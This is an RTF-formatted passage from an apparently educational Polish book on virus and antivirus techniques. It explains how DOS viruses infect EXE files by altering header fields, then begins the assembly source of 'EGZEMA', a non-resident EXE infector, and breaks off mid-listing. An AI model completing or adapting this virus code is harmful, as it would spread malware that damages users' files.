bi}{\f1\fs24\lang1045{\*\listtag0}e}{\f0\fs24\lang1045{\*\listtag0}\uc1\u380\'bf\uc1\u261\'b9co (tzn. na podstawie p\'f3l nag\uc1\u322\'b3\'f3wka), lecz korzystaj\uc1\u261\'b9 z warto\uc1\u347\'9cci sta\uc1\u322\'b3ych. Powy\uc1\u380\'bfsze problemy sprawiaj\uc1\u261\'b9, i\uc1\u380\'bf wi\uc1\u281\'eakszo\uc1\u347\'9c\uc1\u263\'e6 wirus\'f3w zaprzestaje infekcji po wykryciu, i\uc1\u380\'bf plik EXE zawiera nak\uc1\u322\'b3adk\uc1\u281\'ea i dzi\uc1\u281\'eaki temu mo\uc1\u380\'bfna zastosowa\uc1\u263\'e6 opisan\uc1\u261\'b9 wcze\uc1\u347\'9cniej sztuczk\uc1\u281\'ea z 1-bajto}{\f1\fs24\lang1045{\*\listtag0}w}{\f0\fs24\lang1045{\*\listtag0}\uc1\u261\'b9 pseudonak\uc1\u322\'b3adk\uc1\u261\'b9. Infekcja pliku EXE bez wewn\uc1\u281\'eatrznej nak\uc1\u322\'b3adki polega na odpowiedniej modyfikacji sformatowanej cz\uc1\u281\'ea\uc1\u347\'9cci nag\uc1\u322\'b3\'f3wka, tak by pocz\uc1\u261\'b9tkowe warto\uc1\u347\'9cci rejestr\'f3w CS:IP (zawartych w polach 16h-17h i 14h-15h w nag\uc1\u322\'b3\'f3wku) wskazywa\uc1\u322\'b3y na wirusa, kt\'f3ry zwykle}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}dopisywany jest na ko\uc1\u324\'f1cu pliku. Najcz\uc1\u281\'ea\uc1\u347\'9cciej zmieniane s\uc1\u261\'b9 tak\uc1\u380\'bfe pocz\uc1\u261\'b9tkowe warto\uc1\u347\'9cci SS i SP (pola 10-llh i 0Eh-0Fh w nag\uc1\u322\'b3\'f3wku), a\uc1\u380\'bfeby nie okaza\uc1\u322\'b3o si\uc1\u281\'ea, i\uc1\u380\'bf po uruchomieniu stos ustawiony jest na kod wirusa. Warto tak\uc1\u380\'bfe zmodyfikowa\uc1\u263\'e6 parametry minimalnej i mak}{\f1\fs24\lang1045{\*\listtag0}s}{\f0\fs24\lang1045{\*\listtag0}ymalnej pami\uc1\u281\'eaci wymaganej przez program, tak aby uwzgl\uc1\u281\'eadnia\uc1\u322\'b3y d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 kodu wirusa. Prawdziwe warto\uc1\u347\'9cci zmienianych parametr\'f3w trzeba wcze\uc1\u347\'9cniej zapami\uc1\u281\'eata\uc1\u263\'e6, \uc1\u380\'bfeby wirus po uruchomieniu m\'f3g\uc1\u322\'b3 przekaza\uc1\u263\'e6 sterowanie do oryginalnego programu.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Inny spos\'f3b na przej\uc1\u281\'eacie kontroli nad zainfekowanym programem po jego uruchomieniu polega na odnalezieniu w pliku zawieraj\uc1\u261\'b9cym jego kod (np. przy pomocy \uc1\u322\'b3atwo dost\uc1\u281\'eapnej tablicy relokacji) wywo\uc1\u322\'b3a\uc1\u324\'f1 dalekich procedur (najcz\uc1\u281\'ea\uc1\u347\'9cciej b\uc1\u281\'ead\uc1\u261\'b9cych funkcjami bibliotecznymi) o 5 bajtowym kod}{\f1\fs24\lang1045{\*\listtag0}z}{\f0\fs24\lang1045{\*\listtag0}ie 9A OO OO SS SS, gdzie SSSS:OOOO oznacza adres, pod kt\'f3rym znajduje si\uc1\u281\'ea wywo\uc1\u322\'b3ywana procedura (SS SS oznacza segment, a OO OO - przesuni\uc1\u281\'eacie). Inicjuj\uc1\u261\'b9c program, DOS dodaje do ustalonej, zawartej w pliku warto\uc1\u347\'9cci SS SS adres, pod kt\'f3ry zosta\uc1\u322\'b3 za\uc1\u322\'b3adowany }{\f1\fs24\lang1045{\*\listtag0}p}{\f0\fs24\lang1045{\*\listtag0}rogram. Zmieniaj\uc1\u261\'b9c w pliku warto\uc1\u347\'9c\uc1\u263\'e6 SS SS:OO OO tak, by wskazywa\uc1\u322\'b3 on na wirusa, mo\uc1\u380\'bfna omin\uc1\u261\'b9\uc1\u263\'e6 konieczno\uc1\u347\'9c\uc1\u263\'e6 modyfikacji p\'f3l 16h-17h i 14h-15h w nag\uc1\u322\'b3\'f3wku i przy okazji utrudni\uc1\u263\'e6 odnalezienie wirusa w pliku. Tego typu wirus uruchomi si\uc1\u281\'ea dopiero po pr\'f3bie wywo\uc1\u322\'b3an}{\f1\fs24\lang1045{\*\listtag0}i}{\f0\fs24\lang1045{\*\listtag0}a dalekiej procedury, co mo\uc1\u380\'bfe zdarzy\uc1\u263\'e6 si\uc1\u281\'ea w dowolnym momencie programu (a nie od razu na pocz\uc1\u261\'b9tku).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Typowy wygl\uc1\u261\'b9d starego pliku EXE przed i po infekcji przedstawiony zosta\uc1\u322\'b3 w poni\uc1\u380\'bfszych tabelach.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Struktura niezainfekowanego pliku EXE}{\f1\fs24\lang1045{\*\listtag0}        }{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:6.6085in/; table-sdh:89223d0}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx9460
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6 pli}{\f1\fs24\lang1045{\*\listtag0}ku            }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx9460
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Sformatowany nag\uc1\u322\'b3\'f3wek pliku EXE zaczynaj\uc1\u261\'b9cy si\uc1\u281\'ea literami 'MZ' lub 'ZM'}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Niesformatowany nag\uc1\u322\'b3\'f3wek pliku EXE zawieraj\uc1\u261\'b9cy tablic\uc1\u281\'ea relokacji i ewentualnie jakie\uc1\u347\'9c dane, np. nazwisko autora, nazw\uc1\u281\'ea programu}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch W\uc1\u322\'b3a\uc1\u347\'9cciwy kod programu}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ewentualna nak\uc1\u322\'b3adka}{\f1\fs24\lang1045{\*\listtag0}                 }\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Struktura zainfekowanego pliku EXE}{\f1\fs24\lang1045{\*\listtag0}           }{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:6.6085in/; table-sdh:8922138}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx9460
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6 pliku   }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx9460
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Sformatowany nag\uc1\u322\'b3\'f3wek pliku EXE zaczynaj\uc1\u261\'b9cy si\uc1\u281\'ea literami \uc1\u8216\'91MZ\uc1\u8217\'92 lub \uc1\u8216\'91ZM' z wprowadzonymi przez wirusa zmianami}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Niesformatowany nag\uc1\u322\'b3\'f3wek pliku EXE zawieraj\uc1\u261\'b9cy tablic\uc1\u281\'ea relokacji i ewentualnie jakie\uc1\u347\'9c dane, np. nazwisko autora, nazw\uc1\u281\'ea programu}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch W\uc1\u322\'b3a\uc1\u347\'9cciwy kod programu }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Kod wirusa}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ewentualna nak\uc1\u322\'b3adka; wyst\uc1\u281\'eapuje bardzo rzadko, gdy\uc1\u380\'bf wi\uc1\u281\'eakszo\uc1\u347\'9c\uc1\u263\'e6 wirus\'f3w nie zara\uc1\u380\'bfa plik\'f3w z wewn\uc1\u281\'eatrznymi nak\uc1\u322\'b3adkami}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ponizej przedstawiono przyklad prostego nierezydetnego wirusa infekujacego pliki EXE.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       Czesc ksiazki : "Nowoczesne techniki wirusowe i antywirusowe"        ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                  EGZEMA v1.0, Autor : Adam Blaszczyk 1997                  ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              Prosty wirus nierezydentny plikow EXE                         ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              Infekuje pliki z atrybutem Archive, ReadOnly, System, Hidden  ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              znajdujace sie w biezacym katalogu                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; Kompilacja :                                                               ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;             TASM  EGZEMA.ASM                                               ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;             TLINK EGZEMA.OBJ                                               ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch EGZEMA SEGMENT}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JUMPS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch          ASSUME CS:EGZEMA, DS:EGZEMA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     NUL          = 00h                     ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     LF           = 0Ah                     ;  \\ stale znakow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     CR           = 0Dh                     ;  / ASCII}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     DOLAR        = '$'                     ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     AtrReadOnly  = 00000001b               ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     AtrHidden    = 00000010b               ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     AtrSystem    = 00000100b               ;   \\ rozne stale atrybutow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     AtrVolumeID  = 00001000b               ;   / pozycji katalogu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     AtrDirectory = 00010000b               ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     AtrArchive   = 00100000b               ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Atrybut = AtrArchive + AtrReadOnly + AtrSystem + AtrHidden + AtrDirectory}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; atrybut poszukiwanej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; katalogu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VirusDlug     = offset (VirusEnd-VirusStart)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; dlugosc kodu wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VRok          = 1998                       ; \\  data opisujaca}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VMiesiac      = 13                         ;  - pliki juz zainfekowane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VDzien        = 31                         ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VZnacznik     = (VRok-1980)*512+VMiesiac*32+VDzien}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DTAStruc struc                             ; struktura DTA bufora transmisji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; dyskowych uzywanych przez}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; funkcje 4E i 4F}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTAFill db 21 dup (?)       ; nieistotna czesc}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTAAttr db ?                ; atrybut znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTATime dw ?                ; czas znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTADate dw ?                ; data znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTASize dd ?                ; dlugosc znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTAName db 13 dup (?)       ; nazwa znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DTAStruc ends}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VirusStart:                                ; tu zaczyna sie kod wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  Trik                             ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Trik:                                      ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   si                               ;  / oblicz relatywny ofset}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     sub   si,3                             ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  cs                               ; \\ DS=CS=kod wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   ds                               ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,es                            ; \\ es=PSP+10h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     add   ax,10h                           ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     add   [si][StarySS],ax                 ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  [si][StarySS]                    ;  - zachowaj wartosci stosu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  [si][StarySP]                    ; /  dla nosiciela}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     add   ax,[si][StaryCS]                 ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   [si][SkokCS],ax                  ;  \\ utworz pelny rozkaz skoku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,[si][StaryIP]                 ;  / do nosiciela}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   [si][SkokIP],ax                  ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,[si][TeInformacja]            ; podaj gdzie jest tekst}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  Informacja                       ; spytaj o uruchomienie wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jnc   Infekcja                         ; CF=1 oznacza nie uruchamiaj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jmp   BezInfekcji                      ; NIE - nie infekuj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Infekcja:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,[si][NoweDTA]                 ; miejsca gdzie bedzie nowe DTA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,1Ah                           ; funkcja DOS - ustaw nowe DTA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,[si][MaskaEXE]                ; maska poszukiwanych plikow '*.EXE'}{\f2\fs24\lang1045{\*\listtag0}\par}
